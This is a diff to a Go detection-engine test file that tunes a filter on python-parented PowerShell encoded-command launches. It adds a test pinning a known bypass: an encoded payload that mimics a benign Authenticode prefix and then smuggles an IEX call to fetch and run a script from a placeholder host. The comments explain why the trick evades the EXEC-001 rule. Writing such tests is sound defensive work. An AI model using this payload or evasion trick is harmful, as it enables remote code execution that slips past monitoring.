@@ -587,8 +587,8 @@ func TestCursorConPTYHostSuppressed(t *testing.T) {
 // signer-discovery launches (6 hits 09-03→09-08) are quiet, while the same
 // encoded bridge under any other parent, a different encoded payload from
 // the same python parent, and public pseudo-profile parents stay armed. The
-// 104-char base64 anchor is the tool-verified UTF-16LE encoding of exactly
-// 'Get-AuthenticodeSignature -LiteralPath ' (78 bytes = 26x3 — a base64
+// 112-char base64 anchor is the tool-verified UTF-16LE encoding of exactly
+// 'Get-AuthenticodeSignature -LiteralPath @(' (84 bytes = 28x3 — a base64
 // block boundary, so the prefix is fully determined by that fixed benign
 // plaintext regardless of what follows).
 func TestPythonSigverifyEncodedQuiet(t *testing.T) {
@@ -599,6 +599,20 @@ func TestPythonSigverifyEncodedQuiet(t *testing.T) {
 		ParentImage: py, CmdLine: `powershell -NoProfile -EncodedCommand ` + sigEnc})
 	if containsRule(hitRuleIDs(quiet), "EXEC-001") {
 		t.Errorf("python-parented sigverify encoded launch must be filtered; got %v", hitRuleIDs(quiet))
+	}
+	// ACCEPTED RESIDUAL, pinned so any future tuning revisits it consciously
+	// (see filter_python_sigverify RESIDUAL comment; probe
+	// redteam/2026-09-22/sigverify_filter_probe.py): a decoded payload starting
+	// with the exact benign prefix but appending '; IEX(...)' encodes to the
+	// SAME 112-char b64 prefix (block alignment), and the cmdline tail after
+	// the anchor is more base64 — no regex can see the smuggled statement.
+	// Quiet here BY DESIGN; the parent gate + downstream rules carry the defense.
+	mimicEnc := `RwBlAHQALQBBAHUAdABoAGUAbgB0AGkAYwBvAGQAZQBTAGkAZwBuAGEAdAB1AHIAZQAgAC0ATABpAHQAZQByAGEAbABQAGEAdABoACAAQAAoACcAQwA6AFwAVwBpAG4AZABvAHcAcwAKAG8AdABlAHAAYQBkAC4AZQB4AGUAJwApADsAIABJAEUAWAAoAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA5AC8AcAAuAHAAcwAxACkA`
+	residual := realEngine(t).Evaluate(&event.Event{EID: 1, RecordID: 84,
+		Image:       `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
+		ParentImage: py, CmdLine: `powershell -NoProfile -EncodedCommand ` + mimicEnc})
+	if containsRule(hitRuleIDs(residual), "EXEC-001") {
+		t.Errorf("mimic-tail residual changed behavior (expected quiet by design, see filter comment); got %v", hitRuleIDs(residual))
 	}
 	armed := []struct {
 		name string
